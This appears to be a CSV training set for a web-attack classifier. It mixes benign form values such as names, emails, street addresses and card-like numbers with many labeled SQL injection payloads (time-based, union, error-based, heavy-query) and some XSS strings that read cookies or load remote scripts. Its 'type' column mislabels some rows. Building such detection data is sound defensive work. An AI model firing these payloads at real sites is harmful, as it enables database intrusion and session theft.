Text,attack_type,Label,type
mclendon,norm,0,normal
repulsivo,norm,0,normal
p870en538r7,norm,0,normal
74,norm,0,normal
48638626c,norm,0,normal
ezella,norm,0,normal
"1"")) as vgsb where 4747=4747;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
lyden@.mv,norm,0,normal
"1 where 5401=5401 and elt(1210=1210,sleep(5))--",sqli,1,sql
18121520g,norm,0,normal
hierros 161 10f,norm,0,normal
"1'||(select 'nfgq' where 1837=1837 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1' where 1893=1893 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
pascacio,norm,0,normal
"1%"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",sqli,1,sql
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
"1) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
pool echenique,norm,0,normal
3818939386358187,norm,0,normal
"1%'))) and make_set(8403=8403,8899) and ((('%'='",sqli,1,normal
1')) as zbkp where 1720=1720 and 4110=6748#,sqli,1,normal
"1' where 9222=9222 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
pap@evelin.com.ly,norm,0,normal
escaler astorquiza,norm,0,normal
-3497' order by 1#,sqli,1,normal
-9562' or 8571=8571--,sqli,1,sql
e23i6gulo,norm,0,normal
"1) where 1013=1013 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1'||(select 'ssvp' where 3300=3300 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
8382198475912470,norm,0,normal
1916362826143144,norm,0,normal
00984662d,norm,0,normal
"1%' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='",sqli,1,sql
"1"") where 5870=5870 union all select null,null,null--",sqli,1,sql
boniquet jeria,norm,0,normal
09493,norm,0,normal
porquet camarillo,norm,0,normal
mazuela,norm,0,normal
"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",sqli,1,sql
54200725y,norm,0,normal
"-6214"" union all select 3323,3323#",sqli,1,sql
"<div style=""binding: url([link to code]);"">",xss,2,sql
mckuen@ciaplast.cn,norm,0,normal
reginald,norm,0,normal
"calle rio seco, s/n 13-g",norm,0,normal
"1"")));iif(5257=5257,1,1/0)",sqli,1,sql
tajahuerce,norm,0,normal
"-2790') as xhct where 5756=5756 union all select 5756,5756#",sqli,1,sql
1')) as vdhw where 8858=8858 order by 1#,sqli,1,normal
"1') where 9221=9221 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
san juan del olmo,norm,0,normal
86et4ar,norm,0,normal
serkis,norm,0,normal
6051283297189804,norm,0,normal
lomoviejo,norm,0,normal
naguib,norm,0,normal
"calle libertad, 133,",norm,0,normal
guadalajara,norm,0,normal
1084,norm,0,normal
99745017c,norm,0,normal
7770,norm,0,normal
-7103)) or 4610=1871 and ((1249=1249,sqli,1,normal
empentar,norm,0,normal
aedma@quadernideilgarda.ci,norm,0,normal
grandia zarzosa,norm,0,normal
amarr1,norm,0,normal
javiera,norm,0,normal
"-5528') union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",sqli,1,sql
boulay,norm,0,normal
pavan@phd-photodecor.in,norm,0,normal
70289546m,norm,0,normal
renata,norm,0,normal
5533110121299997,norm,0,normal
"general bravo, 189,",norm,0,normal
.bronceada,norm,0,normal
"1 where 2674=2674 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
1) as crsd where 5271=5271 waitfor delay '0:0:5'--,sqli,1,sql
"1)) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((5349=5349",sqli,1,sql
saqib,norm,0,normal
"tras castelo 75, 7g",norm,0,normal
"1%"" and 1343=5939#",sqli,1,normal
"1,(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)",sqli,1,sql
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'='osqf",sqli,1,sql
"1)) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
-4239 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- xacp,sqli,1,sql
1666522520422230,norm,0,normal
"-6000"") where 1797=1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",sqli,1,sql
vasilopo,norm,0,normal
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('diyb' like 'diyb,sqli,1,sql
"='><script>alert(""xss"")</script>",xss,2,xss
3714419514854077,norm,0,normal
782ilidad,norm,0,normal
62tiba74,norm,0,normal
iruraiz-gauna,norm,0,normal
"-7234"") union all select 3154,3154,3154,3154#",sqli,1,sql
guijo de santa brbara,norm,0,normal
43888363q,norm,0,normal
tahsin,norm,0,normal
aran1el1ria,norm,0,normal
rabassa,norm,0,normal
telema,norm,0,normal
drohocka@baybay.mq,norm,0,normal
yuen-lung@hayunmundoahifuera.zm,norm,0,normal
"calle marino cervera, 173,",norm,0,normal
"1'||(select 'zifu' from dual where 4822=4822 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
37257,norm,0,normal
guize_ranson@infotek.bn,norm,0,normal
flloko-humet@imarbella.ms,norm,0,normal
">""<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>",xss,2,xss
22535,norm,0,normal
49135,norm,0,normal
"joaquin verdaguer, 183",norm,0,normal
errol@diseodesoftware.ml,norm,0,normal
caaveruelas,norm,0,normal
"1))) union all select null,null#",sqli,1,sql
8534,norm,0,normal
scheuerm,norm,0,normal
"-5827"") as lskq where 7683=7683 union all select 7683,7683,7683,7683,7683#",sqli,1,sql
56030847h,norm,0,normal
"1""))) and elt(4249=4249,7259) and (((""awyk"" like ""awyk",sqli,1,normal
ribera d'ondara,norm,0,normal
"1'||(select 'fdkl' where 4572=4572 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1"") as qjyu where 2679=2679 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1"" and (select * from (select(sleep(5)))fzno)",sqli,1,sql
ulldemol bujeque,norm,0,normal
p1s9do,norm,0,normal
2742,norm,0,normal
amalie,norm,0,normal
"1 where 2238=2238;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
rasquetear,norm,0,normal
"-4606"") as elek where 8261=8261 or 8571=8571--",sqli,1,sql
3154062648505137,norm,0,normal
"1"" and 4288=3696 and ""qqam"" like ""qqam",sqli,1,normal
tsoucas,norm,0,normal
terangue,norm,0,normal
arnone,norm,0,normal
8322438262219801,norm,0,normal
ryon,norm,0,normal
"1%') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
1;select sleep(5)# wihl,sqli,1,sql
-7562) or 8571=8571--,sqli,1,sql
1) as zzip where 5353=5353 and 3394=3092,sqli,1,normal
chaddock,norm,0,normal
henriquez femenias,norm,0,normal
falerno,norm,0,normal
"1' in boolean mode) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",sqli,1,sql
7427,norm,0,normal
pettitt,norm,0,normal
bic9spide,norm,0,normal
bakey_noah@inmobiliariahangar.ki,norm,0,normal
"-4811%')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'='",sqli,1,sql
cuervo1,norm,0,normal
"calle benito monfort 60,",norm,0,normal
astrolito,norm,0,normal
"-9098'||(select 'xodn' from dual where 8202=8202 union all select 8202,8202,8202,8202,8202,8202,8202--",sqli,1,sql
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",sqli,1,sql
"1"") as ubva where 6369=6369 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
najli,norm,0,normal
pu6ue97,norm,0,normal
45190,norm,0,normal
1'+(select naiw where 4924=4924;select case when 5346=8272 then 1 else null end--,sqli,1,sql
"calle escritor cerda y godoy, 191",norm,0,normal
7alcar19,norm,0,normal
encuar,norm,0,normal
correnta,norm,0,normal
1'||(select 'lxyu' from dual where 5789=5789 union all select null#,sqli,1,sql
1'+(select ijoh where 7145=7145 order by 1--,sqli,1,sql
9280522239849881,norm,0,normal
<script src=//vulnerability-lab.com/.js>,xss,2,normal
"c/ torre, 151, 9?b",norm,0,normal
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,1,sql
"1%"";select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
sobrino coyoma,norm,0,normal
"1' where 6902=6902 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"ginebrosa, la",norm,0,normal
"-1184""))) union all select 1482--",sqli,1,sql
3580665595349534,norm,0,normal
"tres villas, las",norm,0,normal
"1,(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))",sqli,1,sql
"1'+(select zukr where 9215=9215 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))+'",sqli,1,sql
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('kqip' like 'kqip",sqli,1,sql
"botellas, 97 9a",norm,0,normal
"-3853"") where 4626=4626 union all select 4626,4626,4626--",sqli,1,sql
mocoso,norm,0,normal
trese,norm,0,normal
"c/ zumalacarregui 87,",norm,0,normal
9963312363113755,norm,0,normal
murero,norm,0,normal
palau ustrell,norm,0,normal
"-9795) as wrgs where 5427=5427 union all select 5427,5427,5427,5427,5427,5427--",sqli,1,sql
"calle miguel hernandez, 195,",norm,0,normal
alavez anabalon,norm,0,normal
montan cigala,norm,0,normal
enid,norm,0,normal
1%'));begin user_lock.sleep(5); end and (('%'=',sqli,1,sql
42782721f,norm,0,normal
92106863m,norm,0,normal
"1"")) union all select null,null#",sqli,1,sql
rgiva,norm,0,normal
2237,norm,0,normal
beilul,norm,0,normal
lemunao porxas,norm,0,normal
5405,norm,0,normal
kit,norm,0,normal
h61ng19a,norm,0,normal
"1"")));begin user_lock.sleep(5); end--",sqli,1,sql
"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",sqli,1,sql
1%');select case when 7717=7717 then 1 else null end--,sqli,1,sql
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",sqli,1,normal
chanampa coromino,norm,0,normal
dagmar,norm,0,normal
palmieri layi,norm,0,normal
"-9736' or make_set(7311=2067,2067) and 'czdt' like 'czdt",sqli,1,normal
poma gozalbo,norm,0,normal
carretera castilla 139 9?f,norm,0,normal
"1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('cbwx'='cbwx",sqli,1,sql
coca de alba,norm,0,normal
"1') as tygi where 9891=9891 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
"1"" where 3678=3678 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
25559456q,norm,0,normal
lacosta estrader,norm,0,normal
ahmed,norm,0,normal
"1' in boolean mode) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",sqli,1,normal
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""%""=""",sqli,1,sql
"1'+(select qdon where 9453=9453;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1,sql
coe,norm,0,normal
3796618492569421,norm,0,normal
1) as drgs where 1989=1989 order by 1--,sqli,1,sql
c/ castalia 134 12?f,norm,0,normal
ido,norm,0,normal
"1"" where 2035=2035 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
"1))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6265=6265",sqli,1,normal
"1 and 3824=benchmark(5000000,md5(0x76555642))-- kvkk",sqli,1,sql
"1'||(select 'hwyv' from dual where 1155=1155 and 8407=(select count(*) from generate_series(1,5000000)))||'",sqli,1,sql
"1"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""tzog"" like ""tzog",sqli,1,sql
1'))) union all select null#,sqli,1,sql
bueu,norm,0,normal
29640,norm,0,normal
-6487) or 6872=6872 and (7688=7688,sqli,1,normal
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""ffcf"" like ""ffcf",sqli,1,sql
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
"c/ de la villa claudia 44, 4b",norm,0,normal
denys,norm,0,normal
"-7868"")) or 9323=9323#",sqli,1,normal
5316,norm,0,normal
24225,norm,0,normal
pinilla del valle,norm,0,normal
06001,norm,0,normal
"passeig picasso, 23,",norm,0,normal
12163,norm,0,normal
barreras de la bandera,norm,0,normal
"1%'))) union all select null,null,null,null,null,null,null--",sqli,1,sql
"1%"" and elt(3114=3114,sleep(5))#",sqli,1,normal
dorsch.galani@lapasteleria.mg,norm,0,normal
"1"")) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
backer@showcars.com.co,norm,0,normal
candombe,norm,0,normal
9661992110368091,norm,0,normal
trixy,norm,0,normal
1') where 5331=5331;begin dbms_lock.sleep(5); end--,sqli,1,sql
"1'));select * from generate_series(4975,4975,case when (4975=9615) then 1 else 0 end) limit 1--",sqli,1,sql
"1"" where 9618=9618 and (3020=3020)*6703--",sqli,1,sql
"licenciado gonzalez garcia, 170 11d",norm,0,normal
calle virgen de la macarena 72 2-c,norm,0,normal
sykes,norm,0,normal
"1%')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('%'='",sqli,1,normal
1') where 5286=5286;select (case when (1123=9550) then 1123 else 1123*(select 1123 from information_schema.character_sets) end)#,sqli,1,sql
arda,norm,0,normal
"1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='",sqli,1,sql
"1%""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",sqli,1,sql
40542,norm,0,normal
"1"") where 9086=9086 or sleep(5)#",sqli,1,normal
"-2377%'))) union all select 7706,7706--",sqli,1,sql
9528603304738849,norm,0,normal
"<object type=""application/x-shockwave-flash"" data=""http://www.vulnerability-lab.com/hack.swf"" width=""300"" height=""300"">",xss,2,normal
3553,norm,0,normal
75436846c,norm,0,normal
37748,norm,0,normal
arndiga,norm,0,normal
mora de rubielos,norm,0,normal
tracee,norm,0,normal
beas de segura,norm,0,normal
"1"") as hfvz where 7186=7186 union all select null,null,null,null,null,null#",sqli,1,sql
"juan xxii 24, 3?c",norm,0,normal
mackenzie.cointepas0@drivinn.lv,norm,0,normal
"-3415 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- jove",sqli,1,sql
"-3035"") union all select 7912,7912,7912#",sqli,1,sql
retuerta fong,norm,0,normal
50430,norm,0,normal
llull valls,norm,0,normal
ed,norm,0,normal
alfa71ta,norm,0,normal
07460,norm,0,normal
25645562x,norm,0,normal
1320,norm,0,normal
amengual casanova,norm,0,normal
2e64n8m5,norm,0,normal
comalada,norm,0,normal
slezak@ballerpoker.kn,norm,0,normal
co8descender,norm,0,normal
"-7111 union all select 2409,2409,2409,2409,2409,2409#",sqli,1,sql
piols padilla,norm,0,normal
manent niub,norm,0,normal
sant juli del llor i bonmat,norm,0,normal
dukes,norm,0,normal
"<style type=""text/javascript"">document.cookie=true;</style>",xss,2,sql
perr@pasajesaereosbaratos.pm,norm,0,normal
"-5082)) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",sqli,1,sql
dalmacio,norm,0,normal
1 where 7425=7425 rlike (select (case when (4056=3196) then 1 else 0x28 end))--,sqli,1,sql
vieites kerber,norm,0,normal
yeladaky janeiro,norm,0,normal
73107657h,norm,0,normal
46179,norm,0,normal
neils,norm,0,normal
korey_molina@juguetespersonales.gob,norm,0,normal
cabr,norm,0,normal
tripicallero,norm,0,normal
4687701725293094,norm,0,normal
jaramillo quemado,norm,0,normal
1 waitfor delay '0:0:5',sqli,1,normal
"-1823 where 6852=6852 union all select 6852,6852,6852,6852,6852,6852#",sqli,1,sql
"1') as ywtu where 3009=3009 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
minter@ac-activos.sk,norm,0,normal
1230,norm,0,normal
"calle juana ibarborou 134,",norm,0,normal
06327548h,norm,0,normal
"-3541"" or make_set(9354=9354,7185) and ""fgxu""=""fgxu",sqli,1,normal
23715739w,norm,0,normal
paolo,norm,0,normal
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('qtul' like 'qtul,sqli,1,sql
1059842916427607,norm,0,normal
zarraga,norm,0,normal
"1) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"calle san millan, 148, 6?e",norm,0,normal
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
"1'||(select 'ozoj' where 1608=1608;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1"")));select pg_sleep(5) and (((""wqeb""=""wqeb",sqli,1,sql
45253141c,norm,0,normal
carilyn,norm,0,normal
d308ada,norm,0,normal
joab,norm,0,normal
anquela del ducado,norm,0,normal
"-2178'))) or elt(3421=2899,2899) and ((('jdst'='jdst",sqli,1,normal
vosu,norm,0,normal
vinicio,norm,0,normal
altrichter@vilano.cu,norm,0,normal
raqu$9omo,norm,0,normal
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- xlfz",sqli,1,sql
3192907631401763,norm,0,normal
1')));select pg_sleep(5)--,sqli,1,sql
nogueira@magritte.ly,norm,0,normal
"1') as myxr where 6299=6299 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
bardo,norm,0,normal
"c/ rafael belmonte garcia, 29,",norm,0,normal
malcocinado,norm,0,normal
">""<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",xss,2,xss
"1')) and make_set(8403=8403,8899) and (('bmsa'='bmsa",sqli,1,normal
digott_sims@enigmatico.ar,norm,0,normal
1' in boolean mode) order by 1#,sqli,1,normal
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# sipo,sqli,1,sql
teresilda,norm,0,normal
tiza,norm,0,normal
1) where 6725=6725 and 1553=7419,sqli,1,normal
19492,norm,0,normal
91553356q,norm,0,normal
hanisch@todobetis.mm,norm,0,normal
"<script src=""http://vulnerability-lab.com/crosssitescripting.jpg""></script>",xss,2,xss
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('ndhn' like 'ndhn",sqli,1,sql
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('rxxb'='rxxb",sqli,1,sql
kinley3,norm,0,normal
"""alert(1)""><source></source></video>",xss,2,normal
1'||(select 'vxfx' where 7038=7038 and 9306=4187)||',sqli,1,sql
6402952155575779,norm,0,normal
72588514p,norm,0,normal
"1'+(select bldn where 8321=8321 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
6028275465209403,norm,0,normal
098oro4a4,norm,0,normal
c?leptmano,norm,0,normal
hania,norm,0,normal
"san basilio, 142 12?h",norm,0,normal
longhurst-street1@drae2.pa,norm,0,normal
staton,norm,0,normal
pl. andres de soloaga 120 8?e,norm,0,normal
lesire@masqueclases.gn,norm,0,normal
leah,norm,0,normal
28174560c,norm,0,normal
protectorio,norm,0,normal
propaganda,norm,0,normal
"c/ almansa, 91, 6d",norm,0,normal
-6144') or 9385=2474--,sqli,1,sql
dejillo,norm,0,normal
"1')) union all select null,null--",sqli,1,sql
4i7sp375,norm,0,normal
"1"")) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
1) and (select * from (select(sleep(5)))fzno),sqli,1,sql
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('msjw' like 'msjw",sqli,1,sql
3114,norm,0,normal
"acebrn, el",norm,0,normal
marika@tuslimites.mp,norm,0,normal
-6217)) as hyws where 3441=3441 or 9421=4695#,sqli,1,normal
villarrasa,norm,0,normal
1'));if(6554=1534) select 6554 else drop function buqb--,sqli,1,sql
80u90i9,norm,0,normal
"1) where 4866=4866;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
trigueros del valle,norm,0,normal
chalifou,norm,0,normal
"1"")) as yiaw where 2841=2841 or sleep(5)--",sqli,1,sql
9079098959660122,norm,0,normal
harry,norm,0,normal
dannies,norm,0,normal
"-2067"" or 3038=3038",sqli,1,normal
chimeneas,norm,0,normal
ro3eral,norm,0,normal
"c/ aira de villaescusa 199, 1f",norm,0,normal
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('sqbr'='sqbr",sqli,1,sql
1%'));begin user_lock.sleep(5); end--,sqli,1,sql
tripudio,norm,0,normal
37522,norm,0,normal
1')));(select * from (select(sleep(5)))srmq) and ((('jirc'='jirc,sqli,1,sql
molnar@g-audi.pro,norm,0,normal
nicarda,norm,0,normal
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('weof'='weof",sqli,1,sql
vicens,norm,0,normal
de cabezn raizbal,norm,0,normal
"1');select count(*) from generate_series(1,5000000)",sqli,1,sql
zayas vadillo,norm,0,normal
canales,norm,0,normal
marion_daumery1@salacomplices.sd,norm,0,normal
"1"")));(select * from (select(sleep(5)))acdk)#",sqli,1,sql
arney2,norm,0,normal
"1"" where 1203=1203 union all select null,null,null--",sqli,1,sql
lacasse,norm,0,normal
1'||(select 'glyc' from dual where 4058=4058;(select * from (select(sleep(5)))srmq))||',sqli,1,sql
"1')) as ewsw where 4667=4667 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
curi piccech,norm,0,normal
"1%' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'='",sqli,1,sql
benabarre,norm,0,normal
isurieta llano,norm,0,normal
racette,norm,0,normal
baz_azais@filtraciondehumos.sb,norm,0,normal
casacuberta delacerda,norm,0,normal
"1)) as ndrh where 6308=6308;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
panell portaneri,norm,0,normal
c/ tercio de afora 99 8-b,norm,0,normal
"1) where 5378=5378 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
"plaza conde de carlet, 40",norm,0,normal
1 where 7224=7224 and sleep(5)#,sqli,1,normal
"-5672')) union all select 9371,9371,9371,9371,9371,9371--",sqli,1,sql
07250,norm,0,normal
cyros,norm,0,normal
"-5014"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""dkyp"" like ""dkyp",sqli,1,sql
-8521'+(select ucim where 9003=9003 union all select 9003--,sqli,1,sql
"avda. juan carlos i, 195, 6f",norm,0,normal
"1'||(select 'xbvz' from dual where 1632=1632 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
castil de vela,norm,0,normal
-5152')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('jumr' like 'jumr,sqli,1,sql
"c/ costa verde, 100 4c",norm,0,normal
apotrerar,norm,0,normal
"1 or 8466=benchmark(5000000,md5(0x694a4745))",sqli,1,normal
piggot@necesitouncredito.np,norm,0,normal
9u5es2v83ent2,norm,0,normal
"1"" and (select * from (select(sleep(5)))fzno) and ""gddl"" like ""gddl",sqli,1,sql
psicos-is,norm,0,normal
maestro vitoria 10,norm,0,normal
